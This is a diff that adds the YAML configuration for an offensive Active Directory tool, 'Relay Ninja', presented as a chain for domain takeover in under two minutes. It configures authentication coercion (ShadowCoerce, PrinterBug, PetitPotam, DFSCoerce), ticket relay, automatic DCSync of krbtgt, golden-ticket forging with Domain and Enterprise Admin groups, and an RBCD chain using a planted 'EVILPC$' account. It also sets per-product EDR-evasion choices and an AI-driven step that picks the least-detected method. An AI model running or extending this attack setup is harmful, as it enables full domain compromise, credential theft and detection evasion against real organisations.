@@ -1,0 +1,360 @@
+# =============================================================================
+# RELAY NINJA CONFIGURATION
+# =============================================================================
+# Kerberos/AD Relay Attack Chain Configuration
+# Target: Domain Takeover in <2 minutes
+#
+# Usage: Use with kerberos_relay_ninja.py module
+# =============================================================================
+
+relay_ninja:
+  # ==========================================================================
+  # RELAY MODE
+  # ==========================================================================
+  # shadow   - ShadowCoerce (MS-FSRVP) - Newest, least detected
+  # printer  - PrinterBug (MS-RPRN) - Classic, reliable
+  # petit    - PetitPotam (MS-EFSRPC) - May be patched
+  # dfs      - DFSCoerce (MS-DFSNM) - Alternative
+  # all      - Try all methods sequentially
+  # ai_select - AI selects best method based on EDR
+  relay_mode: shadow
+  
+  # Auto-trigger coercion after finding targets
+  auto_trigger: true
+  
+  # Timeout for each phase (seconds)
+  phase_timeout: 30
+  
+  # Total timeout for entire takeover (seconds)
+  total_timeout: 120
+  
+  # Stop on first successful coercion
+  stop_on_success: true
+
+  # ==========================================================================
+  # TARGET CONFIGURATION
+  # ==========================================================================
+  target:
+    domain: "corp.local"
+    dc_ip: "10.0.0.1"
+    dc_hostname: "DC01.corp.local"
+    
+    # Primary target (leave empty for auto-discovery)
+    primary_target: ""
+    
+    # Fallback targets if primary fails
+    fallback_targets:
+      - "DC02.corp.local"
+      - "FILESERVER.corp.local"
+
+  # ==========================================================================
+  # AUTHENTICATION
+  # ==========================================================================
+  credentials:
+    username: "lowpriv_user"
+    password: ""
+    ntlm_hash: ""
+    aes256_key: ""
+    
+    # Ticket to use for auth (if already have one)
+    ticket_path: ""
+    
+    # For krbrelayx AES key extraction
+    machine_account: ""
+    machine_password: ""
+
+  # ==========================================================================
+  # LISTENER CONFIGURATION
+  # ==========================================================================
+  listener:
+    # IP to listen on (auto-detect if empty)
+    ip: ""
+    
+    # Ports for various protocols
+    ports:
+      smb: 445
+      http: 80
+      ldap: 389
+      ldaps: 636
+    
+    # Use krbrelayx for TGT capture
+    use_krbrelayx: true
+    
+    # Alternative: Use ntlmrelayx
+    use_ntlmrelayx: false
+    
+    # Output directory for captured tickets
+    loot_dir: "/tmp/relay_loot"
+
+  # ==========================================================================
+  # COERCION SETTINGS
+  # ==========================================================================
+  coercion:
+    # Delay between coercion attempts (ms)
+    attempt_delay: 1000
+    
+    # Max attempts per method
+    max_attempts: 3
+    
+    # Methods to try (in order)
+    methods:
+      - shadow
+      - printer
+      - dfs
+      - petit
+    
+    # Method-specific settings
+    shadow:
+      share_name: "share"
+      timeout: 30
+    
+    printer:
+      # Use \\listener\pipe\spoolss
+      pipe_name: "spoolss"
+      timeout: 30
+    
+    petitpotam:
+      # Use authenticated or unauthenticated
+      authenticated: true
+      timeout: 30
+    
+    dfscoerce:
+      timeout: 30
+
+  # ==========================================================================
+  # AI JUMP SELECTOR
+  # ==========================================================================
+  ai_selector:
+    # Enable AI-powered target selection
+    enabled: true
+    
+    # Scoring weights
+    weights:
+      unconstrained_bonus: 30
+      dc_bonus: 25
+      high_value_bonus: 15
+      edr_penalty: 10
+    
+    # Minimum score threshold
+    min_score: 50
+    
+    # EDR detection (none, crowdstrike, sentinelone, defender, carbon_black)
+    detected_edr: none
+    
+    # Auto-adjust based on failures
+    adaptive_scoring: true
+
+  # ==========================================================================
+  # POST-EXPLOITATION
+  # ==========================================================================
+  post_exploit:
+    # Execute DCSync after capturing DC TGT
+    auto_dcsync: true
+    
+    # Target accounts for DCSync
+    dcsync_targets:
+      - "krbtgt"
+      - "Administrator"
+      - "DC$"
+    
+    # Forge golden ticket after getting krbtgt hash
+    auto_golden_ticket: true
+    
+    # Golden ticket settings
+    golden_ticket:
+      user: "Administrator"
+      user_id: 500
+      groups:
+        - 512  # Domain Admins
+        - 519  # Enterprise Admins
+        - 518  # Schema Admins
+        - 520  # Group Policy Creator Owners
+      duration_days: 10
+
+  # ==========================================================================
+  # EVASION SETTINGS
+  # ==========================================================================
+  evasion:
+    # Enable evasion techniques
+    enabled: true
+    
+    # Profile: none, default, stealth, paranoid
+    profile: stealth
+    
+    # Delay between actions (ms)
+    action_delay: 500
+    
+    # Randomize delays
+    jitter_percent: 20
+    
+    # Use indirect syscalls where possible
+    indirect_syscalls: true
+    
+    # Rotate source ports
+    source_port_rotation: true
+    
+    # EDR-specific bypass
+    edr_bypass:
+      crowdstrike:
+        avoid_methods: ["petit"]
+        use_methods: ["shadow", "dfs"]
+        extra_delay: 3000
+      
+      sentinelone:
+        avoid_methods: ["printer", "petit"]
+        use_methods: ["shadow"]
+        extra_delay: 2000
+      
+      defender:
+        avoid_methods: ["petit"]
+        use_methods: ["shadow", "printer"]
+        extra_delay: 1000
+
+  # ==========================================================================
+  # LOGGING & REPORTING
+  # ==========================================================================
+  reporting:
+    # Enable verbose logging
+    verbose: true
+    
+    # Log to file
+    log_file: "/tmp/relay_ninja.log"
+    
+    # Generate attack diagram
+    generate_diagram: true
+    
+    # Export results format (json, yaml, html)
+    export_format: "json"
+    
+    # Results output path
+    results_path: "/tmp/relay_ninja_results.json"
+
+# =============================================================================
+# QUICK ATTACK PRESETS
+# =============================================================================
+
+presets:
+  # Quick and dirty - just get DA
+  blitz:
+    relay_mode: all
+    auto_trigger: true
+    stop_on_success: true
+    phase_timeout: 15
+    total_timeout: 60
+    evasion:
+      enabled: false
+  
+  # Stealthy approach - avoid detection
+  ghost:
+    relay_mode: shadow
+    auto_trigger: true
+    stop_on_success: true
+    phase_timeout: 60
+    total_timeout: 300
+    evasion:
+      enabled: true
+      profile: paranoid
+      action_delay: 2000
+      jitter_percent: 50
+  
+  # Balanced - good success rate with some evasion
+  ninja:
+    relay_mode: ai_select
+    auto_trigger: true
+    stop_on_success: true
+    phase_timeout: 30
+    total_timeout: 120
+    evasion:
+      enabled: true
+      profile: stealth
+      action_delay: 500
+
+# =============================================================================
+# ATTACK CHAIN TEMPLATES
+# =============================================================================
+
+chains:
+  # Standard unconstrained delegation abuse
+  unconstrained_takeover:
+    steps:
+      - name: "discover_delegation"
+        action: "find_unconstrained"
+        continue_on_fail: false
+      
+      - name: "start_listener"
+        action: "krbrelayx"
+        params:
+          port: 445
+      
+      - name: "coerce_dc"
+        action: "coerce"
+        params:
+          method: "shadow"
+        continue_on_fail: true
+        fallback: "coerce_all"
+      
+      - name: "wait_tgt"
+        action: "wait"
+        params:
+          timeout: 10
+      
+      - name: "dcsync"
+        action: "secretsdump"
+        params:
+          targets: ["krbtgt", "Administrator"]
+      
+      - name: "golden_ticket"
+        action: "forge_golden"
+        condition: "dcsync_success"
+  
+  # RBCD-based attack chain
+  rbcd_chain:
+    steps:
+      - name: "create_machine"
+        action: "add_computer"
+        params:
+          name: "EVILPC$"
+      
+      - name: "configure_rbcd"
+        action: "rbcd_write"
+        params:
+          target: "${vulnerable_host}"
+          allow: "EVILPC$"
+      
+      - name: "s4u"
+        action: "s4u2proxy"
+        params:
+          impersonate: "Administrator"
+          spn: "cifs/${vulnerable_host}"
+      
+      - name: "use_ticket"
+        action: "secretsdump"
+        params:
+          use_ticket: true
+
+# =============================================================================
+# MITRE ATT&CK LOGGING
+# =============================================================================
+
+mitre_mapping:
+  enabled: true
+  techniques:
+    - id: "T1558.001"
+      name: "Steal or Forge Kerberos Tickets: Golden Ticket"
+      phases: ["forge", "post_exploit"]
+    
+    - id: "T1187"
+      name: "Forced Authentication"
+      phases: ["coerce"]
+    
+    - id: "T1003.006"
+      name: "OS Credential Dumping: DCSync"
+      phases: ["dcsync"]
+    
+    - id: "T1557.001"
+      name: "LLMNR/NBT-NS Poisoning and SMB Relay"
+      phases: ["relay"]
+    
+    - id: "T1134.001"
+      name: "Access Token Manipulation: Token Impersonation"
+      phases: ["s4u", "rbcd"]
